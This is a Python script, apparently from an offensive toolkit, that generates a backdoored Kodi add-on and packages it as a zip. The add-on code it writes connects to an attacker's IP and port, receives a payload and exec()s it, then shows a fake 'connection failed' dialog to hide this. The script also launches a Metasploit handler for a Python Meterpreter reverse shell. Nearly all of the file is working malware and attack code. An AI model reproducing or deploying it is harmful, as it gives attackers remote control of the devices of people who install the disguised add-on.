#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import sys
import io
import shutil
import zipfile
import time
import logging

RescoursesDir = os.getcwd()

dandtime = time.strftime("%H:%M:%S")

logfile = "%s/storage/logs/%s.log" % (RescoursesDir,dandtime)

class Tee(object):
  def __init__(self):
    self.file = open(logfile, 'a')
    self.stdout = sys.stdout

  def __del__(self):
    sys.stdout = self.stdout
    self.file.close()

  def write(self, data):
    self.file.write(data)
    self.stdout.write(data)

sys.stdout = Tee()

def newDir(path):
	try:
		os.mkdir(path, 0755);
		print "Directory created~"
	except OSError:
		print "Directory exists~"

def addonXml(addon_id, addon_name, addon_desc):
	with io.FileIO("KodiBackdoor/addon.xml", "w") as file:
		file.write('''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<addon id="'''+addon_id+'''" name="'''+addon_name+'''" version="1.0.0" provider-name="ASSHT">
	<requires>
		<import addon="xbmc.python" version="2.14.0"/>
	</requires>
	<extension point="xbmc.python.script" library="addon.py">
		<provides>executable</provides>
	</extension>
	<extension point="xbmc.addon.metadata">
		<platform>all</platform>
		<summary lang="en">'''+addon_name+'''</summary>
		<description lang="en">'''+addon_desc+'''</description>
		<license>GNU General Public License, v2</license>
		<language></language>
		<email>webmaster@localhost</email>
		<assets>
			<icon>resources/icon.png</icon>
			<fanart>resources/fanart.jpg</fanart>
		</assets>
		<news>'''+addon_desc+'''</news>
	</extension>
</addon>
''')

def addonPy(ip, port):
	with io.FileIO("KodiBackdoor/addon.py", "w") as file:
		file.write('''
import xbmcaddon
import xbmcgui
import socket,struct
addon       = xbmcaddon.Addon()
addonname   = addon.getAddonInfo('name')
line1 = "Error!"
line2 = "An error occurred"
line3 = "Connection to server failed... please try again later"
s=socket.socket(2,1)
s.connect(("'''+ip+'''",'''+port+'''))
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(4096)
while len(d)!=l:
    d+=s.recv(4096)
exec(d,{'s':s})
xbmcgui.Dialog().ok(addonname, line1, line2, line3)
''')

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

addown = "evil"
idon = "evilsystem"
desc = "evildesc"
iper = "192.168.1.8"
porter = "5384"
yen = "yes"

print "\033[1;94m[?]\033[1;m Host :: Your ip you want to listen on"
ip = raw_input('\033[1;92m[+]\033[1;m ip: [' + iper + ']: ') or iper

print "\033[1;94m[?]\033[1;m Port :: Your port you want to listen on"
port = raw_input('\033[1;92m[+]\033[1;m port: [' + porter + ']: ') or porter

print "\033[1;94m[?]\033[1;m Name :: Name of backdoor"
addon_name = raw_input('\033[1;92m[+]\033[1;m Name: [' + addown + ']: ') or addown

print "\033[1;94m[?]\033[1;m ID :: Backdoor ID"
addon_id = raw_input('\033[1;92m[+]\033[1;m ID: [' + idon + ']: ') or idon

print "\033[1;94m[?]\033[1;m Description :: Backdoor description"
addon_desc = raw_input('\033[1;92m[+]\033[1;m ID: [' + desc + ']: ') or desc

newDir("KodiBackdoor")
addonXml(addon_id, addon_name, addon_desc)
addonPy(ip, port)
print "\033[1;92m[*] Created backdoor...\033[1;m"

zipf = zipfile.ZipFile(addon_id+'.zip', 'w', zipfile.ZIP_DEFLATED)
zipdir('KodiBackdoor', zipf)
zipf.close()

os.system("rm -rf KodiBackdoor")

print "\033[1;94m[?]\033[1;m Do you want to start a listener? (msfconsole)"
choose = raw_input('\033[1;92m[+]\033[1;m option: [' + yen + ']: ') or yen

if choose == "yes":
	print "\033[1;92m[*] Starting metasploit...\033[1;m"
	os.system('msfconsole -x "use multi/handler;\set LHOST '+ip+';\set LPORT '+port+';\set PAYLOAD python/meterpreter/reverse_tcp;\exploit"')
else:
	sys.exit()